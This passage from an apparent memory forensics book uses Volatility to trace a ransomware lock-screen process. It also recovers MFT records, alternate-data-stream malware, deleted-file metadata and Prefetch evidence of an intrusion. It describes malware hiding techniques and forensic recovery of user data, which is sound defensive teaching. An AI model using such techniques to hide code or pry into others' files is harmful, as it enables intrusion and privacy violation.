     1   WinSta0       CF_ENHMETAFILE            0x3 ---------- 
     1   WinSta0       CF_BITMAP          0xc3050d23 ---------- 
     1   WinSta0       CF_DIBV5                  0x2 ----------
```

In the next example, a user selected a file on the desktop and pressed Ctrl+C to copy it to another directory. As you might suspect, the entire file contents is not copied to the clipboard in this case. Instead, an object of the `CF_HDROP` format is created with a full path to the file to be copied:

```
$ python vol.py -f xpsp3.vmem --profile=WinXPSP3x86 clipboard -v
Volatility Foundation Volatility Framework 2.4
 [snip]

   0    WinSta0       CF_HDROP           0x10230131 0xe1fa6590

0xe1fa659c  14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0xe1fa65ac  01 00 00 00 43 00 3a 00 5c 00 44 00 6f 00 63 00 ....C.:.\.D.o.c.
0xe1fa65bc  75 00 6d 00 65 00 6e 00 74 00 73 00 20 00 61 00 u.m.e.n.t.s...a.
0xe1fa65cc  6e 00 64 00 20 00 53 00 65 00 74 00 74 00 69 00 n.d...S.e.t.t.i.
0xe1fa65dc  6e 00 67 00 73 00 5c 00 41 00 64 00 6d 00 69 00 n.g.s.\.A.d.m.i.
0xe1fa65ec  6e 00 69 00 73 00 74 00 72 00 61 00 74 00 6f 00 n.i.s.t.r.a.t.o.
0xe1fa65fc  72 00 5c 00 44 00 65 00 73 00 6b 00 74 00 6f 00 r.\.D.e.s.k.t.o.
0xe1fa660c  70 00 5c 00 6e 00 6f 00 74 00 65 00 2e 00 74 00 p.\.n.o.t.e...t.
0xe1fa661c  78 00 74 00 00 00 00 00                         x.t.....
```

Keep in mind that with the `clipboard` plugin, you are recovering clipboard data from all sessions and all window stations. That means if multiple users are logged on (one at the console, one via RDP, etc.), you can extract everyone’s clipboard data.

## Case Study: ACCDFISA Ransomware

The Anti Cyber Crime Department of Federal Internet Security Agency (ACCDFISA) malware, as described by Emsisoft ([http://blog.emsisoft.com/2012/04/11/the-accdfisa-malware-family-ransomware-targetting-windows-servers/](http://blog.emsisoft.com/2012/04/11/the-accdfisa-malware-family-ransomware-targetting-windows-servers/)), is a ransomware that creates a new desktop to display the ransom notice and effectively locks users out of the system until they enter a special code. For example, one of the variants displays the message shown in [Figure 15-5](#figure15-5) after an infected system boots:

![c15f005.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c15/c15f005.png)

*[**Figure 15-5:**](#figureanchor15-5) The malware’s ransomware desktop message*

With no obvious way to get back to the real desktop, users are forced to comply with the attacker’s demands or figure out some other way around it. As shown in [Figure 15-6](#figure15-6), to create this screen-lock effect, the malware uses `CreateDesktopA` to create a new desktop named `My Desktop 2` and then switches to it with `SwitchDesktop`.

![c15f006.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c15/c15f006.png)

*[**Figure 15-6:**](#figureanchor15-6) Code disassembly of the malware preparing the new desktop*

The artifacts this malware leaves in physical memory should not be surprising: a suspiciously named desktop with a single process (besides the typical `csrss.exe`) associated with the desktop. In the output that follows, notice that the desktop is `WinSta0\My Desktop 2`, and the only thread attached to the desktop (besides those from `csrss.exe`) is thread ID 308 from `svchost.exe`. As you can imagine, a single thread running alone in a desktop is not typical.

```
$ python vol.py –f ACCFISA.vmem --profile=WinXPSP3x86 deskscan
Volatility Foundation Volatility Framework 2.4
[snip]
**************************************************
Desktop: 0x24675c0, Name: WinSta0\My Desktop 2, Next: 0x820a47d8
SessionId: 0, DesktopInfo: 0xbc310650, fsHooks: 0
spwnd: 0xbc3106e8, Windows: 111
Heap: 0xbc310000, Size: 0x300000, Base: 0xbc310000, Limit: 0xbc610000
 652 (csrss.exe 612 parent 564)
 648 (csrss.exe 612 parent 564)
 308 (svchost.exe 300 parent 240)
```

Let’s view a tree of the windows in the suspicious desktop. So far, you know that `svchost.exe` is most likely the malware process, but you need a bit more evidence to explicitly link it with the ransomware message.

```
$ python vol.py -f ACCFISA.vmem --profile=WinXPSP3x86 wintree
Volatility Foundation Volatility Framework 2.4
 [snip]
**************************************************
Window context: 0\WinSta0\My Desktop 2
[snip]
.#100e2  csrss.exe:612 -
.#100e4  csrss.exe:612 -
#100de (visible) csrss.exe:612 -
.Anti-Child Porn Spam Protection (18 U.S.C. ? 2252) (visible) svchost.exe:300 WindowClass_0
..Send Code (visible) svchost.exe:300 Button
..#100ee (visible) svchost.exe:300 Edit
..Your Id #: 1074470467 Our special service email: security11220@gmail.com (visible) svchost.exe:300 Static
..Your ID Number and our contacts (please write down this data): (visible) svchost.exe:300 Static
..#100e8 (visible) svchost.exe:300 Static
[snip]
```

As you can see, all the windows for the ransom message are owned by `svchost.exe` with process ID 300. Now you can start your initial investigation based on this specific process. For example, using `dlllist` shows that it is not a real `svchost.exe` because it is hosted out of the `C:\wnhsmlud` directory:

```
$ python vol.py -f ACCFISA.vmem --profile=WinXPSP3x86 dlllist -p 300
Volatility Foundation Volatility Framework 2.4
************************************************************************
svchost.exe pid:    300
Command line : "C:\wnhsmlud\svchost.exe" 
Service Pack 3

Base             Size Path
---------- ---------- ----
0x00400000    0x2f000 C:\wnhsmlud\svchost.exe
0x7c900000    0xb2000 C:\WINDOWS\system32\ntdll.dll
0x7c800000    0xc60f000 C:\WINDOWS\system32\kernel32.dll
0x77c10000    0x58000 C:\WINDOWS\system32\MSVCRT.dll
[snip]
```

With information on the executable path name, you can search for it in the registry. In the following output, it is easily locatable in the registry hives cached in memory:

```
$ python vol.py -f ACCFISA.vmem --profile=WinXPSP3x86 printkey 
      -K "Microsoft\Windows\CurrentVersion\Run"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\software
Key name: Run (S)
Last updated: 2012-07-23 01:57:05 
Subkeys:

Values:
REG_SZ        VMware Tools    : (S) "C:\Program Files\VMware\VMware 
Tools\VMwareTray.exe"
REG_SZ        VMware User Process : (S) "C:\Program Files\VMware\VMware 
Tools\VMwareUser.exe"
REG_SZ        SunJavaUpdateSched : (S) "C:\Program Files\Common Files\
Java\Java Update\jusched.exe"
REG_SZ        svchost         : (S) C:\wnhsmlud\svchost.exe
```

You followed the artifacts in the GUI subsystem and they led you straight to the malware’s running process and its persistence mechanism.

## Summary

Analysts and investigators often overlook hooks in the Windows GUI subsystem. In fact, the messaging and event-dispatching architecture is too frequently ignored altogether. Now that you’ve seen examples of detecting malware in memory by analyzing the related artifacts, you can begin to integrate such checks into your cases. Furthermore, data in a user’s clipboard, the names of desktops objects, and the messages displayed in window titles are also valuable sources of evidence.
# Chapter 16  
 Disk Artifacts in Memory

This chapter focuses on file system artifacts from the Windows New Technology File System (NTFS). You can find various file system artifacts in memory because the operating system and users constantly open, read, write, and delete files. These actions leave traces in memory—some of which last longer than others, because Windows is specifically designed to cache content for performance reasons. As a result, you can often perform an unexpectedly high degree of disk forensics by just looking in memory. This is critical because time-sensitive investigations may allow for acquisition of a 4GB memory sample, but not a 250GB disk image. Likewise, even if you have access to a suspect system’s disk, artifacts from file-system-related actions are replicated in RAM, so you can leverage them as a strong source of corroborating evidence.

In this chapter, you will learn how to extract various types of file system artifacts from memory dumps. In particular, you’ll examine cases that utilize memory forensics to prove an unauthorized user copied and then deleted sensitive company documents. In other examples, you’ll see how finding Master File Table (MFT) records can help you investigate malicious code that hides in alternate data streams (ADS), and how it has aided us in tracking a targeted attacker’s actions once they gained access to a victim system. Near the end of the chapter, you’ll explore internals of the Windows Cache Manager, which teaches you how to recover executables, documents, and pictures straight out of memory. Lastly, we show how memory forensics can help you defeat full disk encryption by recovering cached passwords and master encryption keys.

## Master File Table

In NTFS, everything is stored as a file. This includes special metadata files used for organizing and tracking other files. For example, the MFT is a special file located at the root of the file system (`\$Mft`), which stores critical information about all other files on the partition. As you’re about to see, because Windows reads the MFT, you can find all or part of the file in memory at any given time. Thus by locating and carving out this one file’s content, you can quickly enumerate a majority of the file system’s metadata.

The MFT contains one entry for every file and directory on the file system. Each entry, which has a maximum size of 1024 bytes, contains information such as the name, type (hidden, regular file, directory), and the locations on the disk where its data can be found. Each entry’s attributes also include timestamps that indicate when the associated file was created, modified, and accessed. Most attributes of interest are *resident,* or contained within the 1024-byte MFT entry. However, because the size of the entry is limited, some attributes, such as the `$DATA` attribute (which is used to store the file’s contents), are often *non-resident* and therefore found outside of the MFT entry.

---

**NOTE**

You can find the size of MFT entries for a system in a special NTFS file named `$Boot`. MFT entries normally have a maximum size of 1024 bytes, but they can actually be as large as 4096 bytes on Advanced Format drives (see [http://www.hexacorn.com/blog/2012/05/04/sector-size-and-mft-file-record-size](http://www.hexacorn.com/blog/2012/05/04/sector-size-and-mft-file-record-size)). This extra space can increase your potential to find residual data in slack space of the MFT entries.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Find and parse MFT entries**: Learn how to properly locate and parse MFT entries to recover full file paths and their associated timestamps (created, modified, accessed, and so on).
- **Investigate removable media**: You can find MFT entries in memory that describe files accessed from removable media, including TrueCrypt volumes.
- **Recover Alternate Data Streams**: Recover data that malware hides in ADS, such as configuration files and executables.
- **Recover attacker scripts**: Discover how to utilize the MFT to recover attacker scripts from memory. For example, batch scripts used to automate repetitive tasks are often small enough to fit inside an MFT entry; thus, you can easily extract them from memory.
- **Reconstruct events**: Utilize the MFT to reconstruct attacker activities, such as exploit staging and reconnaissance. For example, you can determine when a set of tools was downloaded to a victim system. You can find traces of sensitive files being gathered in a directory and compressed—a common precursor to exfiltration.
- **Prove code execution**: By analyzing Prefetch files, you can also determine if and when certain programs executed on the system.
- **Track user activity**: You can discover if users accessed certain files (by looking for LNK shortcuts) and if they tried to cover their tracks by moving files into the Recycle bin.

---

### The MFTParser Plugin

The `mftparser` plugin extracts MFT entries from memory samples by scanning the physical address space for `FILE` and `BAAD` signatures. After entries are found, the plugin parses the attributes, builds the file path for the file, and outputs the pertinent information. The attributes that the `mftparser` plugin currently supports include:

- The `$FILE_NAME` (`$FN`) attribute
- The `$STANDARD_INFORMATION` (`$SI`) attribute
- The `$DATA` attribute

The `$DATA` attribute contains the file contents for resident files. It’s also possible for an MFT entry to have multiple `$DATA` attributes, as in the case of ADS—which are described later in the chapter.

---

**NOTE**

If you need a refresher on concepts and data structures related to disk forensics, see *File System Forensic Analysis* by Brian Carrier: [http://www.digital-evidence.org/fsfa](http://www.digital-evidence.org/fsfa).

---

[Figure 16-1](#figure16-1) shows a simplified example of an MFT entry. Although other types of attributes usually occur in the entry, this diagram shows you only the attributes most relevant to the discussions in this chapter. One thing to note is that the MFT entry may not actually use up its entire allotted space, leaving unused “slack” space at the end, as shown in the figure.

If a file’s data is 700 bytes or less, its entire contents will be resident in the `$DATA` attribute of the MFT entry, making it recoverable using this plugin. Conversely, you can’t use the `mftparser` plugin to recover the content of non-resident files; however, it may be possible to extract the file using the `dumpfiles` plugin, as discussed later in this chapter.

![c16f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f001.png)

*[**Figure 16-1:**](#figureanchor16-1) Example MFT Entry*

---

**NOTE**

It is possible to recover `$DATA` “residue” for a previously resident file. For example, a file can start small and later grow to exceed the maximum size of the `$DATA` attribute, thus making the file non-resident (see [http://traceevidence.blogspot.com/2013/03/a-quick-look-at-mft-resident-data-on.html](http://traceevidence.blogspot.com/2013/03/a-quick-look-at-mft-resident-data-on.html)). When this happens, the original contents of the file remain accessible in the MFT, despite being only a partial, outdated copy (especially on drives using 4096-byte MFT entries).

---

The `mftparser` plugin has two output modes: the default “verbose” mode and a “body” mode, which outputs in bodyfile format for compatibility with the Sleuthkit’s `mactime` utility (see [http://wiki.sleuthkit.org/index.php?title=Body_file](http://wiki.sleuthkit.org/index.php?title=Body_file)). The verbose mode output includes the MFT entry’s path, file type, timestamps, record number, and resident data (if any).

The following example shows an MFT entry for a log file that a key logger created. In the output, you can see the physical offset of the MFT entry (`0x2a41600`), that its record number is 22052, and it’s for a file (not a directory). Also, you can see the timestamps found in the `$SI` and `$FN` attributes as well as the file’s path on disk and its resident `$DATA`:

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 mftparser 
      --output-file=mftverbose.txt 
Volatility Foundation Volatility Framework 2.4
[snip]
*******************************************************
MFT entry found at offset 0x2a416000
Attribute: In Use & File 
Record Number: 22052
Link count: 1
$STANDARD_INFORMATION
Creation:    2013-03-10 23:24:45 UTC+0000 
Modified:    2013-03-10 23:28:49 UTC+0000   
MFT Altered: 2013-03-10 23:28:49 UTC+0000    
Access:      2013-03-10 23:24:45 UTC+0000    
Type: Archive
$FILE_NAME
Creation:    2013-03-10 23:24:45 UTC+0000 
Modified:    2013-03-10 23:24:45 UTC+0000   
MFT Altered: 2013-03-10 23:24:45 UTC+0000   
Access:      2013-03-10 23:24:45 UTC+0000   
Name/Path:   Users\Andrew\Desktop\log.txt
$DATA
0000000000: 3c3f786d6c2076657273696f6e3d2231  <?xml.version="1
0000000010: 2e30223f3e0a3c656e7472793e3c7469  .0"?>.<entry><ti
0000000020: 6d653e332f31302f3230313320363a32  me>3/10/2013.6:2
0000000030: 353a333520504d3c2f74696d653e3c6b  5:35.PM</time><k
0000000040: 6579733e623352714f446c7664476f34  eys>b3RqODlvdGo4
0000000050: 4f54466f63334d756148527949436858  OTFoc3MuaHRyIChX
0000000060: 616e6c3664334d70494368485a6e4e77  anl6d3MpIChHZnNw
0000000070: 4948527249455a79616e647561475967  IHRrIEZyanduaGYg
0000000080: 664342556333467563326f6752325a7a  fCBUc3Fuc2ogR2Zz
0000000090: 6347357a624342384946687562484d67  cG5zbCB8IFhubHMg
00000000a0: 546e4d67664342556333467563326f67  TnMgfCBUc3Fuc2og
00000000b0: 546b6b674c53424362696b3d3c2f6b65  TkkgLSBCbik=</ke
00000000c0: 79733e3c2f656e7472793e0d0a3c656e  ys></entry>..<en
00000000d0: 7472793e3c74696d653e332f31302f32  try><time>3/10/2
00000000e0: 30313320363a32383a343920504d3c2f  013.6:28:49.PM</
00000000f0: 74696d653e3c6b6579733e5a33526e4d  time><keys>Z3RnM
0000000100: 54497a5a33526e4d585530654867794d  TIzZ3RnMXU0eHgyM
0000000110: 48647064327070615735354c6d683063  Hdpd2ppaW55Lmh0c
0000000120: 6938766479397a616e6c34616d67674b  i8vdy9zanl4amggK
0000000130: 4664716558703363796b674b464a6d63  FdqeXp3cykgKFJmc
0000000140: 325a73616942485a6e4e77626e4c73e049  2ZsaiBHZnNwbnNsI
0000000150: 4359675557707a6157357a6243424761  CYgUWpzaW5zbCBGa
0000000160: 476830656e4c35e65442384945686d64  Gh0enN5eCB8IEhmd
0000000170: 5735355a6e456756484e714946527a63  W55ZnEgVHNqIFRzc
0000000180: 57357a616942485a6e4e774b513d3d3c  W5zaiBHZnNwKQ==<
0000000190: 2f6b6579733e3c2f656e7472793e0d0a  /keys></entry>..

********************************************************
```

You can also extract the `$DATA` as a raw file, which is useful when dealing with binary content. The `mftparser` plugin accepts the option `–D/--dump-dir` that causes it to dump all resident files to disk. Dumped files are named using the following convention:

```
 file.[MFT entry offset].data[number of data stream].dmp
```

Because there can be multiple `$DATA` attributes, the file naming convention includes a counter, which starts at zero and increases for each `$DATA` section. The following command illustrates using `mftparser` to extract all MFT-resident files. You can see a file with two data streams has been extracted as well (in bold):

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 mftparser 
          --output-file=mftverbose.txt 
          –D mftoutput
Scanning for MFT entries and building directory, this can take a while

$ file mftoutput/* 
mftoutput/file.0x100c7000.data0.dmp: GIF image data, version 89a, 16 x 16
mftoutput/file.0x100c7c00.data0.dmp: GIF image data, version 89a, 12 x 12
mftoutput/file.0x1029f000.data0.dmp: data
mftoutput/file.0x10725800.data0.dmp: GIF image data, version 89a, 23 x 23
mftoutput/file.0x10ac14f000.data0.dmp: ASCII text, with CRLF line terminators
mftoutput/file.0x10cc60f000.data0.dmp: HTML document, ASCII text, 
    with no line terminators
mftoutput/file.0x14b43000.data0.dmp: MS Windows 95 Internet shortcut text 
mftoutput/file.0x173eac00.data0.dmp: PNG image data, 10 x 10, 8-bit/color 
mftoutput/file.0x4013000.data0.dmp:  ASCII text, with no line terminators
mftoutput/file.0x4013000.data1.dmp:  ASCII text, with CRLF line terminators
[snip]  
```

### Alternate Data Streams

Among other reasons, ADS are used to associate security zones with downloaded files. However, malware authors often exploit ADS to hide files on the system because they do not typically appear in directory listings. For example, attackers can hide malicious executables in ADS. ZeroAccess leverages this technique (see [http://mnin.blogspot.com/2011/10/zeroaccess-volatility-and-kernel-timers.html](http://mnin.blogspot.com/2011/10/zeroaccess-volatility-and-kernel-timers.html)) to mask the true path on disk to one of its files.

---

**NOTE**

If you’re not familiar with ADS, see Recipe 10-1 of *Malware Analyst’s Cookbook* or the Alternate Data Streams in the NTFS article here: [https://blogs.technet.com/b/askcore/archive/2013/03/24/alternate-data-streams-in-ntfs.aspx](https://blogs.technet.com/b/askcore/archive/2013/03/24/alternate-data-streams-in-ntfs.aspx)

---

The `mftparser` plugin extracts Alternate Data Streams (ADS), if any exist. You can see in the following output that the host file name, taken from the `$FN` attribute, is `1654157019` and is in the Windows directory. The malicious executable is attached to the host file and hidden in an ADS named `613509021.exe`.

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 mftparser 
Volatility Foundation Volatility Framework 2.4

[snip]

MFT entry found at offset 0x1c02400
Attribute: In Use & File
Record Number: 19053
[snip]
$FILE_NAME
Creation:    2014-02-18 18:27:29 UTC+0000
Modified:    2014-02-18 18:27:29 UTC+0000   
MFT Altered: 2014-02-18 18:27:29 UTC+0000   
Access:      2014-02-18 18:27:29 UTC+0000   
Name/Path:   Windows\1654157019

$DATA
$DATA ADS Name: 613509021.exe
```

On a running system, if you listed the contents of the `Windows` directory without the help of a special tool (such as Sysinternals `streams.exe`), you would not see `613509021.exe`. Likewise, at first glance, it appears that the process is named `1654157019`:

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 pslist 
Volatility Foundation Volatility Framework 2.4
Name         PID    PPID   Thds    Hnds    Sess   Start  
------------ ------ ------ ------ -------- ------ ------ 
[snip]
1654157019    3596    696   1      5       0      2014-02-18 18:27:29 UTC+0000
[snip]
```

However, by looking at `dlllist`, which shows the process path from another perspective (the `PEB`), you can see the process is actually `1654157019:613509021.exe`, which is the ADS.

```
$ python vol.py –f Win7SP1x64.dmp --profile=Win7SP1x64 dlllist -p 3596
Volatility Foundation Volatility Framework 2.4
************************************************************************
1654157019 pid:   3596
Command line : 1654157019:613509021.exe
Service Pack 3
Base             Size  LoadCount Path
---------- ---------- ---------- ----
0x00400000      0x330     0xffff C:\WINDOWS\1654157019:613509021.exe
0x7c900000    0xaf000     0xffff C:\WINDOWS\system32\ntdll.dll
0x7c800000    0xc60f000     0xffff C:\WINDOWS\system32\kernel32.dll
```

---

**NOTE**

In Chapter 8, we describe several other ways to cross-reference the true process name and full path.

---

### The Case of the Illicit File Access

Some users think that simply moving a file into the Recycle Bin makes it disappear from the system. However, as you may know, this couldn’t be further from the truth. Placing a file into the Recycle Bin doesn’t remove or overwrite the file’s content (not immediately anyway). In this case, there was a user who tried to delete a file after he accessed and copied it without permission. But, he did a poor job covering his tracks. In particular, the `RecentDocs` registry key, which identifies recently accessed documents, showed he had opened a file named `Merger Update.docx`.

To investigate, we executed the following command that creates `mftparser` output in the body format and saves it to a file named `mft.body`.

```
$ python vol.py -f Win7SP1x64.vmem --profile=Win7SP1x64 mftparser 
         --output-file=mft.body 
         --output=body
Volatility Foundation Volatility Framework 2.4
Scanning for MFT entries and building directory, this can take a while
```

---

**NOTE**

For more information on the `RecentDocs` registry key (or tracking user activity with registry-related artifacts in general) see *Windows Registry Forensics* by Harlan Carvey: [http://windowsir.blogspot.com](http://windowsir.blogspot.com).

---

#### Files and Shortcuts

While examining the output from `mftparser`, we found proof that the user accessed the `Merger Update.docx` file. Specifically, we found several LNK files for a file named `Merger Update` as well as the `Merger Update.docx` file itself. This proves that not only was the file on the system, but that the user interacted with it by double-clicking it, which created the LNK file.

Because there are three lines per file in the `mftparser` output (one for each of the attributes that contain timestamps), the following `grep` statements are focusing only on the `$FN` entry that contains the long Unicode name (not the short DOS names).

```
$ grep -i "Merger Update" mft.body | grep FILE_NAME | cut -d\| -f2
[MFT FILE_NAME] Users\Andrew\AppData\Roaming\Microsoft\Windows\Recent
    \Merger Update.lnk (Offset: 0x172ece8)
[MFT FILE_NAME] Users\Andrew\AppData\Roaming\Microsoft\Windows\Recent
    \Merger Update.lnk (Offset: 0x1f1b9800)
[MFT FILE_NAME] Users\Andrew\Desktop\Merger Update.docx (Offset: 0x2a187190)
[snip]
[MFT FILE_NAME] Users\Andrew\AppData\Roaming\Microsoft\Office
    \Recent\Merger Update.LNK (Offset: 0x339156d0)
```

You can also use the Sleuthkit `mactime` utility to establish when the document was accessed. Here’s an example:

```
$ grep -i "Merger Update" mft.body | grep FILE_NAME | mactime -d 
Date,Size,Type,Mode,UID,GID,Meta,File Name
Mon Mar 11 2013 00:36:55,480,macb,---a-----------,0,0,22979,[MFT FILE_NAME]
    Users\Andrew\Desktop\Merger Update.docx (Offset: 0x2a187190)
Mon Mar 11 2013 00:37:32,432,macb,---a-----------,0,0,23050,[MFT FILE_NAME] 
    Users\Andrew\AppData\Roaming\Microsoft\Windows\Recent
    \Merger Update.lnk (Offset: 0x172ece8)
[snip]
Mon Mar 11 2013 00:37:38,432,macb,---a-------I---,0,0,23157,[MFT FILE_NAME] 
    Users\Andrew\AppData\Roaming\Microsoft\Office\Recent
    \Merger Update.LNK (Offset: 0x339156d0)
```

#### Searching in the Trash

For an alternate view of the MFT data, we ran `mftparser` again, this time in verbose mode. We found a Recycle Bin `$I` file for the deleted `Merger Update.docx`. The `$I` file contains metadata about the deleted file, such as its size, its original path on disk before being deleted, and a timestamp telling you when it was deleted. It always has a filename of `$I`, followed by several characters, and ends with the original file extension. Because the `$I` file is small (a maximum of 260 bytes), its contents are MFT-resident. Thus, you can easily recover and parse the `$I` file structure to learn more about the deleted file. Here is an example of the verbose output:

```
MFT entry found at offset 0x2a416000
Attribute: In Use & File 
Record Number: 22052
Link count: 2

$STANDARD_INFORMATION
Creation:    2013-03-11 04:39:52 UTC+0000 
Modified:    2013-03-11 04:39:52 UTC+0000   
MFT Altered: 2013-03-11 04:39:52 UTC+0000   
Access:      2013-03-11 04:39:52 UTC+0000   
Type: Archive

$FILE_NAME
Creation:    2013-03-11 04:39:52 UTC+0000 
Modified:    2013-03-11 04:39:52 UTC+0000   
MFT Altered: 2013-03-11 04:39:52 UTC+0000   
Access:      2013-03-11 04:39:52 UTC+0000   
Name/Path:   $Recycle.Bin\S-1-5-21-1133905431-3037184594-
             10822689-1000\$I2NGUYJ.docx

$DATA
0000000000: 01000000000000005842000000000000  ........XB......
0000000010: 00c3b478121ece0143003a005c005500  ...x....C.:.\.U.
0000000020: 73006500720073005c0041006e006400  s.e.r.s.\.A.n.d.
0000000030: 7200650077005c004400650073006b00  r.e.w.\.D.e.s.k.
0000000040: 74006f0070005c004d00650072006700  t.o.p.\.M.e.r.g.
0000000050: 65007200200055007000640061007400  e.r...U.p.d.a.t.
0000000060: 65002e0064006f006300780000000000  e...d.o.c.x.....
```

In the output, you can see that the `$I2NGUYJ.docx` file was created (in the Recycle Bin) at 2013-03-11 04:39:52 and that its MFT-resident data contains the original full path to `Merger Update.docx`. As previously mentioned, you can also extract the embedded timestamp for comparison. Because this is just a raw numerical value, you can use Volatility to make it human-readable.

#### Translating the Embedded Timestamp

The following example shows how to translate the timestamp embedded in `$I` files. First, enter the `volshell` plugin:

```
$ python vol.py -f Win7SP1x64.vmem --profile=Win7SP1x64 volshell
```

Next, import the `addrspace` module to access the `BufferAddressSpace`, which allows you to instantiate objects using raw data. In this case, you can see that the timestamp from the hex dump is copied from the `mftparser` output:

```
>>> import volatility.addrspace as addrspace
>>> bufferas = addrspace.BufferAddressSpace(self._config, 
                 data = "\x00\xc3\xb4\x78\x12\x1e\xce\x01")
```

Next, a `WinTimeStamp` object is instantiated from the buffer address space. This object has the appropriate code to convert the timestamp and display it as a human-readable time. Before printing the value, make sure to set the correct time zone (UTC in this case). As you can see, the result verifies that the file was deleted on 2013-03-11 04:39:52:

```
>>> itime = obj.Object("WinTimeStamp", offset = 0, vm = bufferas)
>>> itime.is_utc = True
>>> str(itime)
'2013-03-11 04:39:52 UTC+0000'
```

The very last line converts the size of the file from hex to decimal (16,984 bytes), which can be compared to the original file size:

```
>>> 0x4258
16984
```

By enumerating MFT records in memory, we were able to find evidence to suggest that the user (or someone who accessed the user’s computer) opened a sensitive file and tried to cover his tracks. Even if the user had emptied his Recycle Bin before disk forensics was performed, there’s a good chance the MFT entry for `$I2NGUYJ.docx` would have still been available in memory.

---

**NOTE**

For more information on the `$I` file format or leveraging Recycle Bin artifacts for forensics, see [http://www.forensicfocus.com/downloads/forensic-analysis-vista-recycle-bin.pdf](http://www.forensicfocus.com/downloads/forensic-analysis-vista-recycle-bin.pdf).

---

### The Case of Data Exfiltration

Jack Crook created an APT-like forensic challenge ([https://docs.google.com/uc?id=0B0e8hEJOUKb9RU1tRUsxenBxWWc&export=download](https://docs.google.com/uc?id=0B0e8hEJOUKb9RU1tRUsxenBxWWc&export=download)) that exemplifies the types of things we have seen in some of our cases. The `mftparser` plugin is quite useful, because it shows what files the attacker dropped and when they were executed.

#### Proof of Execution

When a program runs on a machine, a Prefetch file is created (or updated). Prefetch files were designed to speed up the application startup process. Therefore, a good starting point is to look for interesting Prefetch files to prove what executables ran on the system. In the following output, `mftparser` is run against the memory dump, and then the output is filtered through a few `grep` statements. Each statement is discussed in the following list (the `–i` option makes the filters case-insensitive):

- **grep –i “.pf”:** Return files with a “.pf” extension (Prefetch).
- **grep –i exe:** Of the files that were returned above, select files with “exe” in their path.
- **cut -d\| -f2:** Break the line on pipe characters (|) and print out the second field. `$ python vol.py -f grrcon.raw mftparser --profile=WinXPSP3x86 --output=body --output-file=grrcon_mft.body Volatility Foundation Volatility Framework 2.4 Scanning for MFT entries and building directory, this can take a while` You must then comb through the resulting output and see if anything looks amiss: `$ grep -i ".pf" grrcon_mft.body | \ grep -i exe | \ cut -d\| -f2 [snip] [MFT FILE_NAME] WINDOWS\Prefetch\EXPLORER.EXE-082F38A9.pf (Offset: 0x14bc6800) [MFT FILE_NAME] WINDOWS\Prefetch\SWING-MECHANICS.DOC[1].EXE-013CEA10.pf (Offset: 0x14c42000) [MFT FILE_NAME] WINDOWS\Prefetch\MDDEXE~1.PF (Offset: 0x1503dc00) [MFT STD_INFO] WINDOWS\Prefetch\MDDEXE~1.PF (Offset: 0x1503dc00) [MFT FILE_NAME] WINDOWS\Prefetch\MDD.EXE-1686AFD3.pf (Offset: 0x1503dc00) [snip]`

As you can see, one line of output, shown in bold, looks strange. The original filename, `SWING-MECHANICS.DOC[1].EXE`, indicates that it was meant to look like a Word document, but is actually an executable. Because Windows hides known file extensions by default, many users may be tricked into thinking the file is a Word document because only the `.DOC` extension is visible.

By searching for other Prefetch files, you can find evidence of executables that ran and are not normally found on clean Windows systems (as shown in bold):

```
[MFT FILE_NAME] WINDOWS\Prefetch\SVCHOSTS.EXE-06B6C8D2.pf (Offset: 0x2330d68)
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0xdc05430) 
[MFT FILE_NAME] WINDOWS\Prefetch\G.EXE-24E91AA8.pf (Offset: 0x19148000)
[MFT FILE_NAME] WINDOWS\Prefetch\P.EXE-04500029.pf (Offset: 0x1b2dd000)
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0x1eb2a400)
```

You can then use this information to find the original full paths of these files. Here’s an example:

```
$ grep -i \\\\r.exe grrcon_mft.body | grep FILE_NAME | cut -d\| -f2
[MFT FILE_NAME] WINDOWS\Prefetch\R.EXE-19834F9B.pf (Offset: 0xd6b4400)
[MFT FILE_NAME] WINDOWS\system32\systems\r.exe (Offset: 0x18229400)
```

---

**NOTE**

The hash in the name of a Prefetch file is based on the file’s path. Because the hashes are unique for every executable (except for “hosting” programs like `dllhost.exe`), you can easily determine whether a Prefetch file is associated with a particular program found on disk. Here are two helpful utilities:

- Python script: [https://raw2.github.com/gleeda/misc-scripts/master/prefetch/prefetch_hash.py](https://raw2.github.com/gleeda/misc-scripts/master/prefetch/prefetch_hash.py)
- Perl script: [http://www.hexacorn.com/blog/2012/06/13/prefetch-hash-calculator-a-hash-lookup-table-xpvistaw7w2k3w2k8](http://www.hexacorn.com/blog/2012/06/13/prefetch-hash-calculator-a-hash-lookup-table-xpvistaw7w2k3w2k8)

---

#### The Fake “systems” Directory

You now have the path, and you know that the “`systems`” folder is not found by default on Windows systems, which makes this file even more suspicious. You can then see what else is in that folder. In the following output, you also see another folder named “1” that might be used to stage “confidential” PDFs:

```
$ grep -i \\\\systems\\\\ grrcon_mft.body | grep FILE_NAME | cut -d\| -f2
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential3.pdf (Offset: 0x6927500)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential4.pdf (Offset: 0xd6948b0)
[MFT FILE_NAME] WINDOWS\system32\systems\w.exe (Offset: 0xdc8b800)
[MFT FILE_NAME] WINDOWS\system32\systems\1\confidential5.pdf 
    (Offset: 0x10a1cc88)
[MFT FILE_NAME] WINDOWS\system32\systems\f.txt (Offset: 0x15938800)
[MFT FILE_NAME] WINDOWS\system32\systems\g.exe (Offset: 0x15938c00)
[MFT FILE_NAME] WINDOWS\system32\systems\p.exe (Offset: 0x18229000)
[MFT FILE_NAME] WINDOWS\system32\systems\r.exe (Offset: 0x18229400)
[MFT FILE_NAME] WINDOWS\system32\systems\sysmon.exe (Offset: 0x18229800)
